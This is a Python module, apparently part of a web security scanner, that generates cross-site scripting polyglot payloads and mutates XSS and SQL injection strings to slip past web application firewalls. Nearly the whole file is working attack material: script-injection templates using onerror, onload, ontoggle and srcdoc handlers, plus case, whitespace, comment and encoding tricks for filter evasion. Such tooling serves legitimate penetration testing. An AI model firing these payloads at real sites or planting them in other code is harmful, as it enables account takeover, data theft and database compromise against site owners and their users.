"""
websecure.core.mutator
~~~~~~~~~~~~~~~~~~~~~~
Payload mutation engine for WAF evasion and polyglot generation.
Provides static helpers used by XSS and SQLi scanners.
"""
from __future__ import annotations
import random
from typing import List


class Mutator:
    """Static payload mutation helpers."""

    # ------------------------------------------------------------------
    # XSS polyglots
    # ------------------------------------------------------------------
    _POLYGLOTS = [
        "javascript:/*--></title></style></textarea></script></xmp>"
        "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+{expr}//'>",
        "'\"><img src=x onerror={expr}>",
        "<svg><script>alert&#40;{expr}&#41;</script>",
        "\"><details open ontoggle={expr}>",
        "<iframe srcdoc=\"<script>{expr}</script>\">",
        "<!--<img src='--><img src=x onerror={expr}//>",
        "<math><mtext></form><form><msup><mo></msup><mtext>"
        "</form><form id=x></math><button form=x onclick={expr}>X",
    ]

    # XSS encoding / mutation transforms
    _XSS_TRANSFORMS = [
        lambda p: p.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"),
        lambda p: p.replace("<script>", "<script >"),
        lambda p: p.replace("alert", "ale\x00rt").replace("\x00", ""),
        lambda p: p.replace("alert(", "alert\x09("),
        lambda p: p.replace('"', "'"),
        lambda p: p.replace("'", '"'),
        lambda p: p.replace("onerror=", "ONERROR="),
        lambda p: p.replace("<img", "<IMG"),
        lambda p: p + "<!--",
        lambda p: "//" + p,
    ]

    # SQL mutation transforms
    _SQL_TRANSFORMS = [
        lambda p: p.replace("OR", "||").replace("AND", "&&"),
        lambda p: p.replace("OR", "oR").replace("AND", "aNd"),
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace(" ", "\t"),
        lambda p: p.replace("=", " LIKE "),
        lambda p: p.upper(),
        lambda p: p.lower(),
        lambda p: p.replace("'", "''"),
        lambda p: p.replace("--", "#"),
        lambda p: "/*!50000" + p + "*/",
    ]

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    @staticmethod
    def mutate_polyglot(expr: str) -> List[str]:
        """Return a list of XSS polyglot strings embedding *expr*."""
        result = []
        for tmpl in Mutator._POLYGLOTS:
            try:
                result.append(tmpl.replace("{expr}", expr))
            except Exception:
                result.append(tmpl)
        return result

    @staticmethod
    def mutate_xss(payload: str) -> List[str]:
        """Return a list of XSS variants of *payload* via encoding transforms."""
        variants = [payload]
        for transform in Mutator._XSS_TRANSFORMS:
            try:
                mutated = transform(payload)
                if mutated != payload:
                    variants.append(mutated)
            except Exception:
                pass
        return variants

    @staticmethod
    def mutate_sql(payload: str) -> List[str]:
        """Return a list of SQL variants of *payload* for WAF evasion."""
        variants = [payload]
        # Apply a random subset of transforms to avoid too many duplicates
        transforms = random.sample(
            Mutator._SQL_TRANSFORMS,
            k=min(4, len(Mutator._SQL_TRANSFORMS))
        )
        for transform in transforms:
            try:
                mutated = transform(payload)
                if mutated != payload:
                    variants.append(mutated)
            except Exception:
                pass
        return variants
